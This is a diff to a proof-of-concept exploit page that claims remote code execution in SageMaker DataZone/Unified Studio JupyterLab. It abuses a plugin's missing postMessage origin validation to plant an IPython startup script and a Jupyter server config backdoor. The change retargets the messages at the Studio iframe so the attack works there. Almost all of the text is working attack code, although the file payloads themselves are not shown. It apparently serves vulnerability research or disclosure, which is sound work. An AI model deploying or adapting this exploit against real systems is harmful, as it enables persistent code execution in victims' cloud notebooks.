@@ -18,10 +18,10 @@
   <h1>PoC: postMessage → RCE SageMaker DataZone/Unified Studio</h1>
   <p style="color:#5a5a7a;font-size:12px">@amzn/sagemaker-ui-doc-manager-jl-plugin — missing origin validation → IPython startup + Jupyter config backdoor</p>
 
-  <label>Target JupyterLab URL:</label>
-  <input id="url" value="https://XXXXX.studio.us-east-2.sagemaker.aws/jupyterlab/default/lab" />
-  <label>Wait for Studio to load (ms):</label>
-  <input id="wait" value="8000" />
+  <label>Target DataZone/Unified Studio Project URL:</label>
+  <input id="url" value="https://example.com/projects/4cy7e339sr8omh/code" />
+  <label>Wait for Studio + iframe to load (ms):</label>
+  <input id="wait" value="12000" />
 
   <button id="launchBtn">Click Anywhere To Launch Exploit</button>
   <div id="status"></div>
@@ -49,8 +49,18 @@ function exploit() {
   setTimeout(function() {
     if (w.closed) { status('Popup was closed.', 'err'); return; }
 
+    // The JupyterLab instance is inside an iframe (sagemaker-ui-code-ide).
+    // Cross-origin: we can't access w.document, but w[0] gives us the
+    // first child frame's window, which we can postMessage into.
+    var target = w[0];
+    if (!target) {
+      status('Could not find iframe — try increasing wait time.', 'err');
+      return;
+    }
+    status('Found iframe window (w[0]). Sending payloads...', 'ok');
+
     // Attack 1: IPython startup script — auto-executes on every kernel start
-    w.postMessage({
+    target.postMessage({
       type: 'sagemaker:nbevent:OpenOrCreateFile',
       payload: {
         type: 'file',
@@ -64,7 +74,7 @@ function exploit() {
 
     // Attack 2: Jupyter server config — executes on server restart
     setTimeout(function() {
-      w.postMessage({
+      target.postMessage({
         type: 'sagemaker:nbevent:OpenOrCreateFile',
         payload: {
           type: 'file',
